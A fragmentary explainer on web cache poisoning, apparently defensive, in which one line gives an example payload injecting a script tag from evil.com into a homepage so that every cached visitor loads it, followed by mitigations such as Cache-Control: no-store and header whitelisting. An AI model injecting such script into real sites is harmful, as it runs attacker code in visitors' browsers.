...
Whether partial requests (query params) map to same cache entry.
...
Attacker injects <script src="https://evil.com/x.js"></script> into homepage.

Cache stores this malicious page.

All visitors load attacker’s script.
...
Set strict caching rules

Cache-Control: no-store for dynamic/user-specific content.

Whitelist headers and parameters
